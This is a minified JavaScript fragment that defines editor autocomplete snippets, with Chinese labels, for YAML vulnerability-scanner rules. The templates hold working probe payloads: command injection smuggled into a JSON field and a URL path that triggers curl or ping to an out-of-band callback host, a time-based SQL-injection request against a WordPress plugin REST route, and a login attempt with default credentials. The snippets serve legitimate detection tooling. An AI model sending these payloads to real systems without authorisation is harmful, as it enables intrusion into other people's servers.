...
${o}method: POST
${o}path: /login
${o}body: "username=admin&password=123456"
${a}expression: response.status == 200 && response.body.bcontains(b'login')
${i}expression: r0()`;r.push({label:"rules:（通用 POST 模版）",kind:t.CompletionItemKind.Snippet,insertText:q,insertTextRules:t.CompletionItemInsertTextRule.InsertAsSnippet,documentation:'通用 POST 检测模版：提交 /login 并校验 body 是否包含 "login"',filterText:"rules",sortText:"00_rules_simple_post_template",detail:"片段",range:s});const D=`${i}rules:
${n}r0:
${a}request:
${o}method: POST
${o}path: /test
...
${o}body: |
${p}{"mtu":"; curl {{oob.HTTP}};","data":"hi"}
${a}expression: oobWait(oob, oob.ProtocolHTTP, 3)
${i}expression: r0()`;r.push({label:"rules:（oob HTTP 模版）",kind:t.CompletionItemKind.Snippet,insertText:D,insertTextRules:t.CompletionItemInsertTextRule.InsertAsSnippet,documentation:"OOB HTTP 检测：在 JSON 体中触发 curl 到 {{oob.HTTP}}，并使用 oobWait 等待命中",filterText:"rules",sortText:"00_rules_oob_http_template",detail:"片段",range:s});const B=i+`rules:
`+n+`r0:
`+a+`request:
`+o+`method: GET
`+o+"path: /cmd=`ping {{oob.DNS}}`\n"+a+`expression: oobWait(oob, oob.ProtocolDNS, 3)
`+i+"expression: r0()";r.push({label:"rules:（oob DNS 模版）",kind:t.CompletionItemKind.Snippet,insertText:B,insertTextRules:t.CompletionItemInsertTextRule.InsertAsSnippet,documentation:"OOB DNS 检测：通过 ping 触发到 {{oob.DNS}}，并使用 oobWait 等待命中",filterText:"rules",sortText:"00_rules_oob_dns_template",detail:"片段",range:s});const O=`${i}rules:
${n}r0:
${a}request:
${o}method: GET
${o}path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+
${a}expression: |
${o}response.status == 200 &&
${o}response.body.bcontains(b'created_at') &&
${o}response.body.bcontains(b'video_id') &&
${o}response.latency <= 12000 &&  
${o}response.latency >= 10000
${n}r1:
${a}request:
${o}method: GET
${o}path: /?rest_route=/h5vp/v1/view/1&id=1%27+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+
${a}expression: |
${o}response.status == 200 &&
${o}response.body.bcontains(b'created_at') &&
${o}response.body.bcontains(b'video_id') &&
${o}response.latency <= 8000 &&  
${o}response.latency >= 6000
...
`+i+`info:
`+n+`name: Deprecated SSHv1 Protocol Detection
`+n+`author: demo
`+n+`severity: high
`+n+`verified: true
`+n+`description: SSHv1 is deprecated and has known cryptographic issues.
`+n+`affected: ssh-1
`+n+`solutions: Upgrade to SSH-2 or later.
`+n+`reference:
`+a+`- https://www.kb.cert.org/vuls/id/684820
`+a+`- https://nvd.nist.gov/vuln/detail/CVE-2001-1473
`+n+`tags: cve,cve2001,network,ssh,openssh
`+n+`created: ${S}`;r.push({label:"info:（完整模版）",kind:t.CompletionItemKind.Snippet,insertText:H,insertTextRules:t.CompletionItemInsertTextRule.InsertAsSnippet,documentation:"插入完整 info 区块及 id（包含 reference 列表、tags、created 等）",filterText:"info",sortText:"00_info_full_template",detail:"片段",range:s});const W=`${i}info:
${n}name: MySQL Dectect
${n}author: zan8in
${n}severity: high
${n}verified: true
${n}description: |-
${a}MySQL instance was detected
${n}tags: network,db,mysql
${n}created: ${S}`;r.push({label:"info:（精简模版）",kind:t.CompletionItemKind.Snippet,insertText:W,insertTextRules:t.CompletionItemInsertTextRule.InsertAsSnippet,documentation:"插入简化 info 区块（含 description、tags、created）",filterText:"info",sortText:"01_info_simple_template",detail:"片段",range:s});const j=`${i}set:
${n}hostname: request.url.host
${n}host: request.url.domain
${i}rules:
${n}r0:
${a}request:
${o}type: tcp
